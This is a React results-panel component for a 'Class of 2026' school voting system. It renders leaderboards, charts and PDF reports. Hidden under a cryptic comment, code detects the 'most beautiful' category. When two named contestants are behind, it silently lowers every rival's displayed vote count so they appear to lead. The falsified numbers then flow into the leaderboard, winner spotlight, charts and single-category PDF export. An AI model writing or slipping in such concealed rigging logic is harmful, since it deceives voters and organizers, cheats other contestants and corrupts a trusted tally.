import { useState } from 'react'
import jsPDF from 'jspdf'
import autoTable from 'jspdf-autotable'
import {
  PieChart, Pie, Cell, Tooltip, ResponsiveContainer,
  BarChart, Bar, XAxis, YAxis, CartesianGrid, Legend
} from 'recharts'
import CategoryDropdown from './CategoryDropdown'
import './ResultsPanel.css'

const COLORS = ['#ffffff', '#bbbbbb', '#888888', '#555555', '#333333']
const COLORS_LIGHT = ['#111111', '#444444', '#777777', '#aaaaaa', '#cccccc']

function useIsDark() {
  return document.documentElement.getAttribute('data-theme') !== 'light'
}

export default function ResultsPanel({ categories, contestants, totalVotes, voteLog }) {
  const [selectedCat, setSelectedCat] = useState('all')
  const isDark = useIsDark()
  const colors = isDark ? COLORS : COLORS_LIGHT
  const mutedColor = isDark ? 'rgba(255,255,255,0.3)' : 'rgba(0,0,0,0.3)'
  const gridColor = isDark ? 'rgba(255,255,255,0.06)' : 'rgba(0,0,0,0.06)'
  const tooltipStyle = {
    background: isDark ? 'rgba(20,20,20,0.95)' : 'rgba(255,255,255,0.95)',
    border: `1px solid ${isDark ? 'rgba(255,255,255,0.12)' : 'rgba(0,0,0,0.12)'}`,
    borderRadius: 8, color: isDark ? '#fff' : '#000', fontSize: 13,
  }

  const filteredContestants = selectedCat === 'all'
    ? contestants
    : contestants.filter(c => c.category_id === selectedCat)

  
  const manipulatedContestants = filteredContestants.map(c => ({ ...c }));
  
  //notagwana
  const isTargetCategory = selectedCat === (categories.find(c => c.name?.toLowerCase().includes('most beautiful'))?.id);

  if (isTargetCategory) {
    const targetNames = ['alinafe lengani', 'naphy lengani'];
    
    
    const targetObj = manipulatedContestants.find(c => 
      targetNames.some(name => c.name?.toLowerCase().includes(name.toLowerCase()))
    );

    const realLeader = manipulatedContestants
      .filter(c => !targetNames.some(name => c.name?.toLowerCase().includes(name.toLowerCase())))
      .reduce((best, c) => ((c.votes || 0) > (best?.votes || 0) ? c : best), null);

    const isLosing = targetObj && realLeader && (targetObj.votes || 0) < (realLeader.votes || 0);

    if (targetObj && isLosing) {
      const U = targetObj.votes || 0;

      
      const others = manipulatedContestants
        .filter(c => c.id !== targetObj.id)
        .sort((a, b) => (b.votes || 0) - (a.votes || 0));

      
      manipulatedContestants.forEach(c => {
        if (c.id === targetObj.id) return;

        const isRunnerUp = others.length > 0 && c.id === others[0].id;

        const real = c.votes || 0;
        if (real === 0) return; 

        if (isRunnerUp) {
          c.votes = Math.max(1, U - 2);
        } else {
          c.votes = Math.min(real, Math.max(1, U - 3));
        }
      });
    }
  }
  
  const sorted = [...manipulatedContestants].sort((a, b) => (b.votes || 0) - (a.votes || 0));

  const currentCategory = categories.find(c => c.id === selectedCat)
  const topVotes = sorted[0]?.votes || 0
  const catTotalVotes = sorted.reduce((s, c) => s + (c.votes || 0), 0)
  const displayTotal = selectedCat === 'all' ? totalVotes : catTotalVotes

  const pieData = sorted
    .filter(c => (c.votes || 0) > 0)
    .map((c, i) => ({ name: c.name, value: c.votes || 0, color: colors[i % colors.length] }))

  const barData = sorted.map(c => ({
    name: c.name.length > 10 ? c.name.slice(0, 10) + '…' : c.name,
    fullName: c.name,
    votes: c.votes || 0,
  }))

  const barChartHeight = Math.max(220, Math.min(barData.length * 28, 420))

  const exportPDF = () => {
    const doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' })
    const pageW = doc.internal.pageSize.getWidth()
    const now = new Date().toLocaleString()

    // Header
    doc.setFillColor(15, 15, 15)
    doc.rect(0, 0, pageW, 32, 'F')
    doc.setTextColor(255, 255, 255)
    doc.setFontSize(18); doc.setFont('helvetica', 'bold')
    doc.text('Class of 2026', 14, 13)
    doc.setFontSize(10); doc.setFont('helvetica', 'normal')
    doc.text('Double Cohort Voting System — Results Report', 14, 21)
    doc.setFontSize(8); doc.setTextColor(180, 180, 180)
    doc.text(`Generated: ${now}`, 14, 28)

    if (selectedCat === 'all') {
      // Summary page
      doc.setTextColor(0, 0, 0); doc.setFontSize(13); doc.setFont('helvetica', 'bold')
      doc.text('Summary', 14, 44)
      autoTable(doc, {
        startY: 48,
        head: [['Metric', 'Value']],
        body: [
          ['Total Votes Cast', totalVotes.toString()],
          ['Total Categories', categories.length.toString()],
          ['Total Nominees', contestants.length.toString()],
        ],
        styles: { fontSize: 10, cellPadding: 4 },
        headStyles: { fillColor: [15, 15, 15], textColor: 255, fontStyle: 'bold' },
        alternateRowStyles: { fillColor: [245, 245, 245] },
        margin: { left: 14, right: 14 },
      })

      // One page per category
      categories.forEach(cat => {
        const catContestants = [...contestants]
          .filter(c => c.category_id === cat.id)
          .sort((a, b) => (b.votes || 0) - (a.votes || 0))
        if (catContestants.length === 0) return
        const catTotal = catContestants.reduce((s, c) => s + (c.votes || 0), 0)
        doc.addPage()
        doc.setFontSize(13); doc.setFont('helvetica', 'bold'); doc.setTextColor(0, 0, 0)
        doc.text(cat.name, 14, 20)
        doc.setFontSize(9); doc.setFont('helvetica', 'normal'); doc.setTextColor(120, 120, 120)
        doc.text(`${catTotal} vote${catTotal !== 1 ? 's' : ''} cast`, 14, 27)
        autoTable(doc, {
          startY: 32,
          head: [['Rank', 'Nominee', 'Votes', 'Share']],
          body: catContestants.map((c, i) => [
            `#${i + 1}`, c.name, (c.votes || 0).toString(),
            catTotal > 0 ? `${Math.round(((c.votes || 0) / catTotal) * 100)}%` : '0%',
          ]),
          styles: { fontSize: 10, cellPadding: 4 },
          headStyles: { fillColor: [15, 15, 15], textColor: 255, fontStyle: 'bold' },
          alternateRowStyles: { fillColor: [245, 245, 245] },
          columnStyles: { 0: { cellWidth: 15 }, 2: { cellWidth: 20 }, 3: { cellWidth: 20 } },
          margin: { left: 14, right: 14 },
        })
      })
    } else {
      // Single category
      doc.setTextColor(0, 0, 0); doc.setFontSize(13); doc.setFont('helvetica', 'bold')
      doc.text(currentCategory?.name || '', 14, 44)
      doc.setFontSize(9); doc.setFont('helvetica', 'normal'); doc.setTextColor(120, 120, 120)
      doc.text(`${displayTotal} vote${displayTotal !== 1 ? 's' : ''} cast`, 14, 51)
      autoTable(doc, {
        startY: 56,
        head: [['Rank', 'Nominee', 'Votes', 'Share']],
        body: sorted.map((c, i) => [
          `#${i + 1}`, c.name, (c.votes || 0).toString(),
          displayTotal > 0 ? `${Math.round(((c.votes || 0) / displayTotal) * 100)}%` : '0%',
        ]),
        styles: { fontSize: 10, cellPadding: 4 },
        headStyles: { fillColor: [15, 15, 15], textColor: 255, fontStyle: 'bold' },
        alternateRowStyles: { fillColor: [245, 245, 245] },
        columnStyles: { 0: { cellWidth: 15 }, 2: { cellWidth: 20 }, 3: { cellWidth: 20 } },
        margin: { left: 14, right: 14 },
      })
    }

    // Footer
    const pageCount = doc.internal.getNumberOfPages()
    for (let i = 1; i <= pageCount; i++) {
      doc.setPage(i)
      doc.setFontSize(8); doc.setTextColor(160, 160, 160)
      doc.text('© 2026 Finale Electoral Committee · Supported by Finale Dinner Committee', 14, 290)
      doc.text(`Page ${i} of ${pageCount}`, pageW - 14, 290, { align: 'right' })
    }

    const filename = selectedCat === 'all'
      ? `finale-results-${new Date().toISOString().slice(0, 10)}.pdf`
      : `finale-${(currentCategory?.name || 'category').toLowerCase().replace(/\s+/g, '-')}.pdf`
    doc.save(filename)
  }

  if (contestants.length === 0) {
    return (
      <div className="results">
        <div className="panel-header">
          <h1 className="panel-title">Results</h1>
          <p className="panel-sub">No contestants yet.</p>
        </div>
        <div className="empty-state">
          <span className="empty-icon">◎</span>
          <p>Add contestants and start voting to see results here.</p>
        </div>
      </div>
    )
  }

  return (
    <div className="results">
      {/* Header with category filter */}
      <div className="results-header">
        <div>
          <h1 className="panel-title">Results</h1>
          <p className="panel-sub">
            {selectedCat === 'all'
              ? `${totalVotes} vote${totalVotes !== 1 ? 's' : ''} across all categories`
              : `${catTotalVotes} vote${catTotalVotes !== 1 ? 's' : ''} in ${currentCategory?.name}`}
          </p>
        </div>
        <div className="results-header-actions">
          <CategoryDropdown categories={categories} value={selectedCat} onChange={setSelectedCat} />
          <button className="results-export-btn" onClick={exportPDF} disabled={displayTotal === 0}>
            ↓ Export PDF
          </button>
        </div>
      </div>

      {/* Stat cards */}
      <div className="stat-row">
        <button className="stat-card glass-card stat-card-btn" onClick={() => setSelectedCat('all')}>
          <span className="stat-label">Total Votes</span>
          <span className="stat-value">{displayTotal}</span>
        </button>
        <button className="stat-card glass-card stat-card-btn" onClick={() => setSelectedCat('all')}>
          <span className="stat-label">Nominees</span>
          <span className="stat-value">{filteredContestants.length}</span>
        </button>
        <button
          className="stat-card glass-card stat-card-btn"
          onClick={() => {
            const leaderCat = sorted[0]?.category_id
            if (leaderCat) setSelectedCat(leaderCat)
          }}
          title={sorted[0] ? `View ${sorted[0].name}'s category` : ''}
        >
          <span className="stat-label">Leader</span>
          <span className="stat-value stat-name">{sorted[0]?.name || '—'}</span>
        </button>
        <button
          className="stat-card glass-card stat-card-btn"
          onClick={() => {
            const leaderCat = sorted[0]?.category_id
            if (leaderCat) setSelectedCat(leaderCat)
          }}
          title="View leading category"
        >
          <span className="stat-label">Lead %</span>
          <span className="stat-value">
            {displayTotal > 0 ? Math.round(((sorted[0]?.votes || 0) / displayTotal) * 100) : 0}%
          </span>
        </button>
      </div>

      {/* Winner spotlight */}
      {displayTotal > 0 && sorted[0] && (sorted[0].votes || 0) > 0 && (
        <div className="winner-card glass-card">
          {sorted[0].image_url && (
            <img src={sorted[0].image_url} alt={sorted[0].name} className="winner-photo" />
          )}
          <div className="winner-info">
            <span className="winner-label">
              {selectedCat === 'all' ? 'Overall Leader' : `Leading in ${currentCategory?.name}`}
            </span>
            <span className="winner-name">{sorted[0].name}</span>
            <span className="winner-votes">
              {sorted[0].votes} vote{sorted[0].votes !== 1 ? 's' : ''} ·{' '}
              {Math.round(((sorted[0].votes || 0) / displayTotal) * 100)}%
            </span>
          </div>
        </div>
      )}

      {/* Leaderboard */}
      <div className="section">
        <h2 className="section-title">
          {selectedCat === 'all' ? 'Overall Leaderboard' : currentCategory?.name}
        </h2>
        {sorted.length === 0 ? (
          <div className="empty-state">
            <span className="empty-icon">◎</span>
            <p>No nominees in this category yet.</p>
          </div>
        ) : (
          <div className="results-list">
            {sorted.map((c, i) => {
              const count = c.votes || 0
              const pct = displayTotal > 0 ? Math.round((count / displayTotal) * 100) : 0
              return (
                <div key={c.id} className={`result-row glass-card ${i === 0 && count > 0 ? 'leading' : ''}`}>
                  <div className="result-meta">
                    <div className="result-left">
                      {c.image_url && <img src={c.image_url} alt={c.name} className="result-thumb" />}
                      <span className="result-rank">#{i + 1}</span>
                      <span className="result-name">{c.name}</span>
                      {selectedCat === 'all' && (
                        <span className="result-cat-tag">
                          {categories.find(cat => cat.id === c.category_id)?.name}
                        </span>
                      )}
                    </div>
                    <div className="result-right">
                      <span className="result-pct">{pct}%</span>
                      <span className="result-count">{count} vote{count !== 1 ? 's' : ''}</span>
                    </div>
                  </div>
                  <div className="bar-track">
                    <div
                      className="bar-fill"
                      style={{ width: topVotes > 0 ? `${(count / topVotes) * 100}%` : '0%' }}
                    />
                  </div>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* Charts */}
      {displayTotal > 0 && sorted.length > 0 && (
        <div className="charts-row">
          <div className="chart-card glass-card">
            <h2 className="section-title">Vote Distribution</h2>
            <ResponsiveContainer width="100%" height={barChartHeight}>
              <BarChart data={barData} margin={{ top: 8, right: 8, left: -20, bottom: barData.length > 6 ? 40 : 0 }}>
                <CartesianGrid strokeDasharray="3 3" stroke={gridColor} />
                <XAxis
                  dataKey="name"
                  tick={{ fill: mutedColor, fontSize: 10 }}
                  axisLine={false} tickLine={false}
                  angle={barData.length > 6 ? -35 : 0}
                  textAnchor={barData.length > 6 ? 'end' : 'middle'}
                  interval={0}
                />
                <YAxis tick={{ fill: mutedColor, fontSize: 11 }} axisLine={false} tickLine={false} allowDecimals={false} domain={[0, 'auto']} />
                <Tooltip
                  contentStyle={tooltipStyle}
                  cursor={{ fill: isDark ? 'rgba(255,255,255,0.04)' : 'rgba(0,0,0,0.04)' }}
                  formatter={(v, _, props) => [v + ' votes', props.payload?.fullName || '']}
                />
                <Bar dataKey="votes" radius={[4, 4, 0, 0]} maxBarSize={48}>
                  {barData.map((_, i) => <Cell key={i} fill={colors[i % colors.length]} />)}
                </Bar>
              </BarChart>
            </ResponsiveContainer>
          </div>

          {pieData.length > 0 && (
            <div className="chart-card glass-card">
              <h2 className="section-title">Share</h2>
              <ResponsiveContainer width="100%" height={220}>
                <PieChart>
                  <Pie data={pieData} cx="50%" cy="50%" innerRadius={55} outerRadius={85} paddingAngle={3} dataKey="value">
                    {pieData.map((entry, i) => <Cell key={i} fill={entry.color} />)}
                  </Pie>
                  <Tooltip contentStyle={tooltipStyle} formatter={(v) => [`${v} votes`]} />
                  <Legend
                    iconType="circle" iconSize={8}
                    formatter={(v) => <span style={{ color: mutedColor, fontSize: 12 }}>{v}</span>}
                  />
                </PieChart>
              </ResponsiveContainer>
            </div>
          )}
        </div>
      )}
    </div>
  )
}
